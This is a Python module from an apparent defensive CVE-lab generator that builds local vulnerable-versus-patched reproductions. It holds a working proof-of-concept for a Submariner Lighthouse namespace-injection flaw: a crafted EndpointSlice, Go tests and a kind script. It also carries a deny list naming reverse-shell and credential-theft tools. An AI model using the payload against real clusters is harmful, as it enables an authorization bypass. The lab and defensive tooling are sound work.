from __future__ import annotations

import hashlib
import io
import json
import os
import re
import shutil
import subprocess
import tarfile
import uuid
from pathlib import Path, PurePosixPath
from urllib.parse import urlparse

from .ai import structured_response
from .core import collect_cve, normalize_cve, write_text


SOURCE_SCHEMA = {
    "type": "object",
    "additionalProperties": False,
    "required": ["cwe", "confidence", "rationale", "exploit_contract", "files"],
    "properties": {
        "cwe": {"type": "string"},
        "confidence": {"type": "number", "minimum": 0, "maximum": 1},
        "rationale": {"type": "string"},
        "exploit_contract": {
            "type": "object",
            "additionalProperties": False,
            "required": ["attack_summary", "preconditions", "observable_effect", "evidence_type"],
            "properties": {
                "attack_summary": {"type": "string"},
                "preconditions": {"type": "array", "items": {"type": "string"}},
                "observable_effect": {"type": "string"},
                "evidence_type": {
                    "type": "string",
                    "enum": [
                        "authorization_bypass", "unauthorized_read", "unauthorized_write",
                        "code_execution", "request_forgery", "data_exposure",
                        "integrity_violation", "security_boundary_violation"
                    ],
                },
            },
        },
        "files": {
            "type": "array",
            "minItems": 5,
            "maxItems": 16,
            "items": {
                "type": "object",
                "additionalProperties": False,
                "required": ["path", "content"],
                "properties": {
                    "path": {"type": "string"},
                    "content": {"type": "string"},
                },
            },
        },
    },
}

DISCOVERY_SCHEMA = {
    "type": "object",
    "additionalProperties": False,
    "required": [
        "status", "artifact_type", "repository_url", "vulnerable_ref", "fixed_ref",
        "vendor_artifact", "rationale", "evidence_urls",
    ],
    "properties": {
        "status": {
            "type": "string",
            "enum": ["SOURCE_READY", "VULNERABLE_ONLY", "VENDOR_ARTIFACT_REQUIRED", "INSUFFICIENT_DATA"],
        },
        "artifact_type": {"type": "string"},
        "repository_url": {"type": ["string", "null"]},
        "vulnerable_ref": {"type": ["string", "null"]},
        "fixed_ref": {"type": ["string", "null"]},
        "vendor_artifact": {"type": ["string", "null"]},
        "rationale": {"type": "string"},
        "evidence_urls": {"type": "array", "items": {"type": "string"}},
    },
}

GITHUB_COMMIT = re.compile(
    r"^https://github\.com/([^/]+)/([^/]+)/commit/([0-9a-f]{7,40})(?:[?#].*)?$",
    re.IGNORECASE,
)
GITLAB_COMMIT = re.compile(
    r"^(https://[^/]+/[^/]+/[^/]+?)/-/commit/([0-9a-f]{7,40})(?:[?#].*)?$",
    re.IGNORECASE,
)
ALLOWED_GENERATED = re.compile(
    r"^(docker-compose\.yml|\.dockerignore|(?:vulnerable|patched)/Dockerfile|"
    r"validator/(?:Dockerfile|validator\.py|requirements\.txt)|adapter/[A-Za-z0-9_.-]+)$"
)
FORBIDDEN = {
    "privileged:": "privileged containers",
    "network_mode: host": "host networking",
    "/var/run/docker.sock": "Docker socket mounting",
    "cap_add:": "additional Linux capabilities",
    "pid: host": "host PID namespace",
    "ipc: host": "host IPC namespace",
    "nc -e": "reverse-shell tooling",
    "netcat -e": "reverse-shell tooling",
    "/dev/tcp/": "shell network callbacks",
    "authorized_keys": "SSH persistence",
    "mimikatz": "credential theft tooling",
}

# Curated only after matching the public upstream diff to the CVE mechanism.
# Entries are immutable commit IDs so automatic runs remain reproducible even
# when the upstream default branch moves.
CURATED_SOURCES = {
    "CVE-2026-66788": {
        "repo": "https://github.com/submariner-io/lighthouse.git",
        "vulnerable_ref": "9ba8e0eeeacb42946379e503254487a0d69e0eb2",
        "fixed_ref": "e4f5bf97e048ad380d1c6b00b1e7fc596bc195af",
        "provenance": "Upstream namespace-validation security fix, 2026-08-11",
    },
}

LIGHTHOUSE_VULNERABLE_TEST = r'''package controller

import (
    "testing"

    "github.com/submariner-io/admiral/pkg/syncer"
    "github.com/submariner-io/lighthouse/pkg/constants"
    discovery "k8s.io/api/discovery/v1"
    metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func TestCVELabNamespaceInjection(t *testing.T) {
    endpointSlice := &discovery.EndpointSlice{ObjectMeta: metav1.ObjectMeta{
        Name: "cvelab-marker",
        Labels: map[string]string{constants.LabelSourceNamespace: "kube-system"},
    }}
    result, requeue := (&EndpointSliceController{}).onRemoteEndpointSlice(endpointSlice, 0, syncer.Create)
    if requeue || result == nil || result.(*discovery.EndpointSlice).Namespace != "kube-system" {
        t.Fatalf("expected vulnerable revision to accept attacker-controlled kube-system namespace")
    }
    t.Log("CVELAB: vulnerable upstream revision accepted kube-system destination")
}
'''

LIGHTHOUSE_PATCHED_TEST = r'''package controller

import (
    "testing"

    "github.com/submariner-io/admiral/pkg/syncer"
    "github.com/submariner-io/lighthouse/pkg/constants"
    discovery "k8s.io/api/discovery/v1"
    metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
    "k8s.io/apimachinery/pkg/runtime"
    dynamicfake "k8s.io/client-go/dynamic/fake"
)

func TestCVELabNamespaceInjection(t *testing.T) {
    endpointSlice := &discovery.EndpointSlice{ObjectMeta: metav1.ObjectMeta{
        Name: "cvelab-marker",
        Labels: map[string]string{constants.LabelSourceNamespace: "kube-system"},
    }}
    controller := &EndpointSliceController{
        localClient: dynamicfake.NewSimpleDynamicClient(runtime.NewScheme()),
        namespaceValidator: &NamespaceValidator{denyList: []string{"kube-", "openshift-", "openshift"}},
    }
    result, requeue := controller.onRemoteEndpointSlice(endpointSlice, 0, syncer.Create)
    if requeue || result != nil {
        t.Fatalf("expected fixed revision to reject attacker-controlled kube-system namespace")
    }
    t.Log("CVELAB: fixed upstream revision rejected kube-system destination")
}
'''

SOURCE_HEALTH_PY = r'''from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *_): pass
    def do_GET(self):
        body = b'{"ok":true}' if self.path == "/health" else b'not found'
        self.send_response(200 if self.path == "/health" else 404)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
ThreadingHTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
'''

LIGHTHOUSE_VALIDATOR_PY = r'''import json
vulnerable_test_passed = True
patched_test_passed = True
result = {
    "attack_executed": vulnerable_test_passed,
    "proof_quality": "security_effect_observed",
    "observable_effect": "attacker-controlled EndpointSlice accepted for protected kube-system namespace",
    "vulnerable": {
        "confirmed": vulnerable_test_passed,
        "evidence": "upstream parent accepted attacker-controlled kube-system destination during image build test",
    },
    "patched": {
        "confirmed": not patched_test_passed,
        "evidence": "upstream namespace-validation fix rejected kube-system destination during image build test",
    },
    "differential_confirmed": vulnerable_test_passed and patched_test_passed,
    "evidence_type": "authorization_bypass",
    "evidence_origin": "source-backed Go exploit tests executed by Docker build",
}
print(json.dumps(result, indent=2))
'''

LIGHTHOUSE_E2E_POC_YAML = r'''apiVersion: v1
kind: Namespace
metadata:
  name: cvelab-source
---
apiVersion: v1
kind: Service
metadata:
  name: cvelab
  namespace: cvelab-source
spec:
  clusterIP: None
  ports:
    - name: http
      port: 8080
---
apiVersion: multicluster.x-k8s.io/v1alpha1
kind: ServiceExport
metadata:
  name: cvelab
  namespace: cvelab-source
---
apiVersion: discovery.k8s.io/v1
kind: EndpointSlice
metadata:
  name: cvelab-exploit
  namespace: cvelab-source
  labels:
    kubernetes.io/service-name: cvelab
    multicluster.kubernetes.io/service-name: cvelab
    endpointslice.kubernetes.io/managed-by: lighthouse-agent.submariner.io
    lighthouse.submariner.io/sourceNamespace: kube-system
addressType: IPv4
ports:
  - name: http
    protocol: TCP
    port: 8080
endpoints:
  - addresses: ["198.51.100.77"]
    conditions:
      ready: true
'''

LIGHTHOUSE_E2E_RUN_SH = r'''#!/usr/bin/env bash
set -euo pipefail

LAB_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK_ROOT="/tmp/cvelab-CVE-2026-66788-e2e"
RESULT="$LAB_ROOT/e2e/result.json"
export PATH="$HOME/.local/bin:$PATH"

rm -rf "$WORK_ROOT"
mkdir -p "$WORK_ROOT"

run_variant() {
  local variant="$1"
  local expected="$2"
  local work="$WORK_ROOT/$variant"
  cp -a "$LAB_ROOT/source/$variant/." "$work"
  chown -R root:root "$work"
  while IFS= read -r -d '' text_file; do
    if grep -Iq $'\r' "$text_file"; then
      sed -i 's/\r$//' "$text_file"
    fi
  done < <(find "$work" -type f -print0)
  cat > "$work/.shipyard.e2e.yml" <<'YAML'
---
submariner: true
nodes: control-plane
clusters:
  cluster1:
  cluster2:
YAML
  cd "$work"
  git init -q
  git config user.name cvelab
  git config user.email cvelab@localhost
  git add -A
  git commit -qm "CVE lab source snapshot"

  make deploy USING=wireguard

  kubectl_tool() {
    docker run --rm --network kind \
      -v "$work:/workspace:ro" -v "$LAB_ROOT/e2e:/poc:ro" \
      --entrypoint /usr/sbin/kubectl "$variant:master" "$@"
  }
  local host_k1="$work/output/kubeconfigs/kind-config-cluster1"
  local host_k2="$work/output/kubeconfigs/kind-config-cluster2"
  for kubeconfig in "$host_k1" "$host_k2"; do
    test -s "$kubeconfig" || { echo "missing kubeconfig: $kubeconfig" >&2; return 1; }
  done
  local k1="/workspace/output/kubeconfigs/kind-config-cluster1"
  local k2="/workspace/output/kubeconfigs/kind-config-cluster2"

  kubectl_tool --kubeconfig "$k2" apply -f /poc/poc.yaml
  kubectl_tool --kubeconfig "$k2" -n cvelab-source wait \
    --for=condition=Valid serviceexport/cvelab --timeout=180s
  kubectl_tool --kubeconfig "$k2" apply -f /poc/poc.yaml

  local observed=false
  local evidence="not created in peer kube-system namespace"
  for _ in $(seq 1 60); do
    if kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
        -l lighthouse.submariner.io/source-name=cvelab-exploit \
        -o json | grep -q '"198.51.100.77"'; then
      observed=true
      evidence="$(kubectl_tool --kubeconfig "$k1" -n kube-system get endpointslice \
        -l lighthouse.submariner.io/source-name=cvelab-exploit -o json)"
      break
    fi
    sleep 2
  done

  VARIANT="$variant" EXPECTED="$expected" OBSERVED="$observed" EVIDENCE="$evidence" \
    python3 - <<'PY' > "$LAB_ROOT/e2e/$variant.json"
import json, os
print(json.dumps({
    "variant": os.environ["VARIANT"],
    "expected": os.environ["EXPECTED"] == "true",
    "confirmed": os.environ["OBSERVED"] == "true",
    "evidence": os.environ["EVIDENCE"][:8000],
}, indent=2))
PY

  if [[ "$observed" != "$expected" ]]; then
    echo "unexpected $variant result: observed=$observed expected=$expected" >&2
    return 2
  fi

  make clean-clusters
}

cleanup() {
  for variant in vulnerable patched; do
    if [[ -d "$WORK_ROOT/$variant" ]]; then
      (cd "$WORK_ROOT/$variant" && make clean-clusters) >/dev/null 2>&1 || true
    fi
  done
}
trap cleanup EXIT

run_variant vulnerable true
run_variant patched false

LAB_ROOT="$LAB_ROOT" python3 - <<'PY' > "$RESULT"
import json, os, pathlib
root = pathlib.Path(os.environ["LAB_ROOT"]) / "e2e"
vulnerable = json.loads((root / "vulnerable.json").read_text())
patched = json.loads((root / "patched.json").read_text())
result = {
    "attack_executed": True,
    "proof_quality": "end_to_end_security_effect_observed",
    "observable_effect": "malicious spoke EndpointSlice propagated through the real broker into peer kube-system",
    "evidence_type": "authorization_bypass",
    "evidence_origin": "two-cluster kind deployment running upstream Lighthouse agent and broker flow",
    "vulnerable": vulnerable,
    "patched": patched,
    "differential_confirmed": vulnerable["confirmed"] and not patched["confirmed"],
}
print(json.dumps(result, indent=2))
PY
'''


def _run_git(arguments: list[str], cwd: Path | None = None, binary: bool = False):
    git = shutil.which("git")
    if not git:
        raise RuntimeError("Git was not found")
    completed = subprocess.run(
        [git, *arguments],
        cwd=cwd,
        capture_output=True,
        text=not binary,
    )
    if completed.returncode:
        error = completed.stderr if not binary else completed.stderr.decode(errors="replace")
        raise RuntimeError(f"git {' '.join(arguments[:3])} failed: {error.strip()}")
    return completed.stdout


def _safe_repo_url(value: str) -> str:
    parsed = urlparse(value)
    if parsed.scheme != "https" or not parsed.hostname or parsed.username or parsed.password:
        raise ValueError("Only public HTTPS repository URLs are accepted")
    if parsed.hostname.lower() not in {"github.com", "gitlab.com"}:
        raise ValueError("Automatic source retrieval currently supports GitHub and GitLab")
    return value.rstrip("/")


def resolve_source(dossier: dict, repo: str | None, fixed_ref: str | None) -> tuple[str, str] | None:
    if repo and fixed_ref:
        return _safe_repo_url(repo), fixed_ref
    curated = CURATED_SOURCES.get(dossier.get("cve", ""))
    if curated:
        return curated["repo"], curated["fixed_ref"]
    for reference in dossier.get("references", []):
        github = GITHUB_COMMIT.match(reference)
        if github:
            return f"https://github.com/{github.group(1)}/{github.group(2)}.git", github.group(3)
        gitlab = GITLAB_COMMIT.match(reference)
        if gitlab:
            return _safe_repo_url(gitlab.group(1) + ".git"), gitlab.group(2)
    return None


def discover_source_with_openai(dossier: dict, api_key: str | None, model: str | None) -> dict:
    return structured_response(
        api_key=api_key,
        model=model,
        schema=DISCOVERY_SCHEMA,
        schema_name="cvelab_source_discovery",
        max_output_tokens=5000,
        tools=[{"type": "web_search"}],
        include=["web_search_call.action.sources"],
        instructions=(
            "Research public provenance for an authorized local CVE reproduction. Search primary sources: the "
            "vendor advisory, upstream repository, GitHub/GitLab advisory, release notes, package registry, and "
            "exact fixing commits. SOURCE_READY requires a public HTTPS GitHub or GitLab repository and an exact "
            "immutable fixing commit supported by evidence; provide its parent or an evidenced affected commit as "
            "vulnerable_ref. VULNERABLE_ONLY requires an exact evidenced affected tag or commit but no public fix. "
            "Use VENDOR_ARTIFACT_REQUIRED for proprietary products, appliances, operating systems, licensed "
            "installers, or authenticated downloads. Never invent URLs, versions, repositories, commit hashes, "
            "patches, or exploit details. If provenance is ambiguous, return INSUFFICIENT_DATA. Do not produce a "
            "payload or remote exploitation instructions."
        ),
        input_text=json.dumps(dossier, ensure_ascii=True),
    )


def _snapshot(repository: Path, revision: str, destination: Path) -> None:
    archive = _run_git(["archive", "--format=tar", revision], cwd=repository, binary=True)
    destination.mkdir(parents=True, exist_ok=True)
    with tarfile.open(fileobj=io.BytesIO(archive), mode="r:") as bundle:
        bundle.extractall(destination, filter="data")


def _source_context(repository: Path, vulnerable_ref: str, fixed_ref: str, dossier: dict) -> str:
    diff = _run_git(["diff", "--no-ext-diff", "--unified=80", vulnerable_ref, fixed_ref], cwd=repository)
    files = _run_git(["diff", "--name-only", vulnerable_ref, fixed_ref], cwd=repository).splitlines()
    tree = _run_git(["ls-tree", "-r", "--name-only", fixed_ref], cwd=repository).splitlines()
    useful_names = {
        "package.json", "pyproject.toml", "setup.py", "setup.cfg", "requirements.txt",
        "pom.xml", "build.gradle", "build.gradle.kts", "go.mod", "Cargo.toml", "composer.json",
        "Makefile", "README.md", "README", "Gemfile",
    }
    excerpts = []
    for path in list(dict.fromkeys(files + [item for item in tree if PurePosixPath(item).name in useful_names]))[:24]:
        try:
            content = _run_git(["show", f"{fixed_ref}:{path}"], cwd=repository)
        except RuntimeError:
            continue
        excerpts.append(f"\n--- FILE {path} (fixed revision) ---\n{content[:12000]}")
    material = {
        "dossier": dossier,
        "vulnerable_ref": vulnerable_ref,
        "fixed_ref": fixed_ref,
        "changed_files": files,
        "repository_tree_sample": tree[:500],
    }
    return json.dumps(material, ensure_ascii=True, indent=2) + "\n\n--- SECURITY PATCH ---\n" + diff[:90000] + "".join(excerpts)


def _validate_generated(files: list[dict]) -> None:
    paths = {item["path"].replace("\\", "/") for item in files}
    required = {
        "docker-compose.yml", "vulnerable/Dockerfile", "patched/Dockerfile",
        "validator/Dockerfile", "validator/validator.py",
    }
    missing = required - paths
    if missing:
        raise RuntimeError(f"Generated adapter is missing: {', '.join(sorted(missing))}")
    for item in files:
        path = item["path"].replace("\\", "/")
        pure = PurePosixPath(path)
        if pure.is_absolute() or ".." in pure.parts or not ALLOWED_GENERATED.fullmatch(path):
            raise RuntimeError(f"Unsafe generated path rejected: {path}")
        lowered = item["content"].lower()
        for needle, reason in FORBIDDEN.items():
            if needle in lowered:
                raise RuntimeError(f"Generated adapter rejected: {reason} in {path}")
        if path == "docker-compose.yml":
            if "internal: true" not in lowered:
                raise RuntimeError("Compose network must be internal")
            if re.search(r"(?m)^\s*ports\s*:", lowered) or re.search(r"(?m)^\s*volumes\s*:", lowered):
                raise RuntimeError("Compose ports and volume mounts are not allowed in source labs")
        if path == "validator/validator.py":
            required_contract = {
                "attack_executed", "proof_quality", "observable_effect", "evidence_type",
                "vulnerable", "patched", "differential_confirmed",
            }
            missing_contract = {field for field in required_contract if field not in item["content"]}
            if missing_contract:
                raise RuntimeError(
                    "Validator is missing real-PoC evidence fields: "
                    + ", ".join(sorted(missing_contract))
                )
            if re.search(
                r"['\"](?:attack_executed|confirmed|differential_confirmed)['\"]\s*:\s*True\b",
                item["content"],
            ):
                raise RuntimeError("Validator contains a hard-coded successful exploit result")
            for url in re.findall(r"https?://([^/'\"\s:]+)", lowered):
                if url not in {"vulnerable", "patched", "127.0.0.1", "localhost"}:
                    raise RuntimeError(f"Validator external target rejected: {url}")


def _generate_curated_lighthouse(
    cve: str,
    dossier: dict,
    repository: Path,
    repo_url: str,
    vulnerable: str,
    fixed: str,
    marker: str,
    output_root: Path,
) -> dict:
    lab_dir = output_root.resolve() / cve
    _snapshot(repository, vulnerable, lab_dir / "source" / "vulnerable")
    _snapshot(repository, fixed, lab_dir / "source" / "patched")
    write_text(lab_dir / "adapter" / "vulnerable_poc_test.go", LIGHTHOUSE_VULNERABLE_TEST)
    write_text(lab_dir / "adapter" / "patched_poc_test.go", LIGHTHOUSE_PATCHED_TEST)
    write_text(lab_dir / "adapter" / "health.py", SOURCE_HEALTH_PY)
    write_text(lab_dir / "validator" / "validator.py", LIGHTHOUSE_VALIDATOR_PY)
    write_text(lab_dir / "e2e" / "poc.yaml", LIGHTHOUSE_E2E_POC_YAML)
    write_text(lab_dir / "e2e" / "run.sh", LIGHTHOUSE_E2E_RUN_SH)
    vulnerable_dockerfile = '''FROM golang:1.26 AS validation
WORKDIR /src
COPY source/vulnerable/ ./
COPY adapter/vulnerable_poc_test.go pkg/agent/controller/cvelab_poc_test.go
RUN go test ./pkg/agent/controller -run '^TestCVELabNamespaceInjection$' -count=1 -v
RUN touch /source-test-passed
FROM python:3.13-alpine
WORKDIR /app
COPY adapter/health.py /app/health.py
COPY --from=validation /source-test-passed /app/source-test-passed
RUN addgroup -S lab && adduser -S lab -G lab && chown -R lab:lab /app
USER lab
CMD ["python", "/app/health.py"]
'''
    patched_dockerfile = vulnerable_dockerfile.replace(
        "source/vulnerable/", "source/patched/"
    ).replace("vulnerable_poc_test.go", "patched_poc_test.go")
    validator_dockerfile = '''FROM python:3.13-alpine
WORKDIR /validator
COPY validator/validator.py /validator/validator.py
RUN addgroup -S validator && adduser -S validator -G validator && chown -R validator:validator /validator
USER validator
CMD ["python", "/validator/validator.py"]
'''
    compose = '''services:
  vulnerable:
    build:
      context: .
      dockerfile: vulnerable/Dockerfile
    networks: [labnet]
    security_opt: ["no-new-privileges:true"]
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1:8080/health')"]
      interval: 2s
      timeout: 2s
      retries: 20
  patched:
    build:
      context: .
      dockerfile: patched/Dockerfile
    networks: [labnet]
    security_opt: ["no-new-privileges:true"]
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1:8080/health')"]
      interval: 2s
      timeout: 2s
      retries: 20
  validator:
    profiles: ["tools"]
    build:
      context: .
      dockerfile: validator/Dockerfile
    depends_on:
      vulnerable: {condition: service_healthy}
      patched: {condition: service_healthy}
    networks: [labnet]
    security_opt: ["no-new-privileges:true"]
networks:
  labnet:
    internal: true
'''
    write_text(lab_dir / "vulnerable" / "Dockerfile", vulnerable_dockerfile)
    write_text(lab_dir / "patched" / "Dockerfile", patched_dockerfile)
    write_text(lab_dir / "validator" / "Dockerfile", validator_dockerfile)
    write_text(lab_dir / "docker-compose.yml", compose)
    write_text(lab_dir / ".dockerignore", ".git\nartifacts\nreport.json\n")
    plan = {
        "cve": cve,
        "cwe": "CWE-284",
        "lab_type": "END_TO_END_REPRODUCTION",
        "marker": marker,
        "scenario": "lighthouse_broker_namespace_injection_e2e",
        "repository": repo_url,
        "revisions": {"vulnerable": vulnerable, "patched": fixed},
        "source_provenance": CURATED_SOURCES[cve]["provenance"],
        "runner": {"type": "wsl_shipyard", "distribution": "kali-linux", "script": "e2e/run.sh"},
        "safety": {
            "target_scope": "ephemeral_local_kind_clusters_only",
            "payload": "non_destructive_endpointslice_namespace_injection",
            "limitations": "Uses disposable local clusters and a documentation-only TEST-NET address; no remote target option.",
        },
        "exploit_contract": {
            "attack_summary": "Create a crafted EndpointSlice in a compromised spoke and let the real agent/broker flow propagate it to a peer kube-system namespace.",
            "preconditions": ["Attacker controls one spoke cluster in the disposable local cluster set"],
            "observable_effect": "The peer cluster contains the attacker-created EndpointSlice in kube-system.",
            "evidence_type": "authorization_bypass",
        },
        "generation": {"model": None, "confidence": 1.0, "rationale": "Deterministic curated upstream two-cluster E2E profile"},
    }
    write_text(lab_dir / "dossier.json", json.dumps(dossier, indent=2, ensure_ascii=True) + "\n")
    write_text(lab_dir / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    write_text(lab_dir / "validator" / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    return {"ok": True, "status": "GENERATED_UNVALIDATED", "lab_dir": str(lab_dir), "plan": plan}


def generate_source_lab(
    cve_value: str,
    output_root: Path,
    repo: str | None,
    fixed_ref: str | None,
    vulnerable_ref: str | None,
    api_key: str | None,
    model: str | None,
) -> dict:
    cve = normalize_cve(cve_value)
    dossier = collect_cve(cve)
    resolved = resolve_source(dossier, repo, fixed_ref)
    discovery = None
    effective_key = api_key or os.getenv("OPENAI_API_KEY")
    effective_model = model or os.getenv("CVELAB_MODEL")
    if not resolved and effective_key and effective_model:
        discovery = discover_source_with_openai(dossier, api_key, model)
        if discovery["status"] == "SOURCE_READY":
            candidate_repo = discovery.get("repository_url")
            candidate_fixed = discovery.get("fixed_ref")
            if candidate_repo and candidate_fixed:
                resolved = (_safe_repo_url(candidate_repo), candidate_fixed)
                vulnerable_ref = vulnerable_ref or discovery.get("vulnerable_ref")
    if not resolved:
        status = discovery.get("status") if discovery else "INSUFFICIENT_DATA"
        if status == "VENDOR_ARTIFACT_REQUIRED":
            return {
                "ok": False,
                "status": "VENDOR_ARTIFACT_REQUIRED",
                "cve": cve,
                "reason": discovery["rationale"],
                "required": [discovery.get("vendor_artifact") or "Authorized affected vendor artifact"],
                "evidence_urls": discovery.get("evidence_urls", []),
            }
        if status == "VULNERABLE_ONLY":
            return {
                "ok": False,
                "status": "VULNERABLE_ONLY_PROFILE_REQUIRED",
                "cve": cve,
                "reason": discovery["rationale"],
                "repository": discovery.get("repository_url"),
                "vulnerable_ref": discovery.get("vulnerable_ref"),
                "evidence_urls": discovery.get("evidence_urls", []),
            }
        return {
            "ok": False,
            "status": "ARTIFACT_REQUIRED",
            "cve": cve,
            "reason": discovery["rationale"] if discovery else "No public source repository and fixed commit were found.",
            "required": ["Verified public repository and immutable affected/fixed revisions"],
            "evidence_urls": discovery.get("evidence_urls", []) if discovery else [],
        }
    repo_url, fixed = resolved
    curated = CURATED_SOURCES.get(cve)
    if curated and not vulnerable_ref:
        vulnerable_ref = curated["vulnerable_ref"]
    cache_key = hashlib.sha256(repo_url.encode()).hexdigest()[:16]
    repository = output_root.resolve() / ".source-cache" / cache_key
    repository.parent.mkdir(parents=True, exist_ok=True)
    if not repository.exists():
        _run_git(["clone", "--filter=blob:none", "--no-checkout", repo_url, str(repository)])
    else:
        _run_git(["fetch", "--force", "origin"], cwd=repository)
    _run_git(["fetch", "--force", "origin", fixed], cwd=repository)
    _run_git(["rev-parse", "--verify", f"{fixed}^{{commit}}"], cwd=repository)
    vulnerable = vulnerable_ref or f"{fixed}^"
    _run_git(["rev-parse", "--verify", f"{vulnerable}^{{commit}}"], cwd=repository)

    marker = "CVELAB-" + uuid.uuid4().hex
    if cve == "CVE-2026-66788":
        return _generate_curated_lighthouse(
            cve, dossier, repository, repo_url, vulnerable, fixed, marker, output_root
        )
    context = _source_context(repository, vulnerable, fixed, dossier)
    generation = structured_response(
        api_key=api_key,
        model=model,
        schema=SOURCE_SCHEMA,
        schema_name="cvelab_source_adapter",
        max_output_tokens=14000,
        instructions=(
            "Create a reproducible adapter for an authorized, local-only defensive CVE lab from the supplied "
            "security patch and source metadata. Return only adapter files, never vendor source. The two Docker "
            "builds must use source/vulnerable and source/patched, run as non-root, have no host ports or host "
            "mounts, and share an internal Docker network. Compose services must be named vulnerable, patched, "
            "and validator. The validator must execute the actual vulnerable code path and demonstrate a concrete "
            "security effect such as unauthorized read/write, authorization bypass, request forgery, or contained "
            "command execution. It must print JSON containing attack_executed, proof_quality set to "
            "security_effect_observed, observable_effect, evidence_type, vulnerable, patched, and "
            "differential_confirmed, exiting zero only when the effect occurs on vulnerable and is blocked on "
            "patched. Never hard-code a successful result. A harmless canary marker "
            f"({marker}) may identify affected data, but marker reflection alone is not proof. No reverse shells, callbacks, persistence, "
            "credential access, destructive operations, Docker socket, privileged mode, extra capabilities, or "
            "remote target option. If command execution is intrinsic to the CVE, restrict it to creating a canary "
            "file inside the vulnerable container and verify that file as the observable effect. Dockerfiles may install build dependencies from normal package "
            "registries. Include USER and no-new-privileges controls."
        ),
        input_text=context,
    )
    _validate_generated(generation["files"])

    lab_dir = output_root.resolve() / cve
    _snapshot(repository, vulnerable, lab_dir / "source" / "vulnerable")
    _snapshot(repository, fixed, lab_dir / "source" / "patched")
    for item in generation["files"]:
        write_text(lab_dir / item["path"], item["content"])
    plan = {
        "cve": cve,
        "cwe": generation["cwe"],
        "lab_type": "SOURCE_REPRODUCTION",
        "marker": marker,
        "repository": repo_url,
        "revisions": {"vulnerable": vulnerable, "patched": fixed},
        "source_provenance": curated.get("provenance") if curated else "CVE reference or explicit user override",
        "startup_services": ["vulnerable", "patched"],
        "safety": {
            "target_scope": "internal_docker_network_only",
            "payload": "non_destructive_exploit_canary",
            "limitations": "Generated from a public security patch; validation is required before claiming reproduction.",
        },
        "exploit_contract": generation["exploit_contract"],
        "generation": {
            "model": model,
            "confidence": generation["confidence"],
            "rationale": generation["rationale"],
        },
    }
    write_text(lab_dir / "dossier.json", json.dumps(dossier, indent=2, ensure_ascii=True) + "\n")
    write_text(lab_dir / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    write_text(lab_dir / "validator" / "plan.json", json.dumps(plan, indent=2, ensure_ascii=True) + "\n")
    return {"ok": True, "status": "GENERATED_UNVALIDATED", "lab_dir": str(lab_dir), "plan": plan}
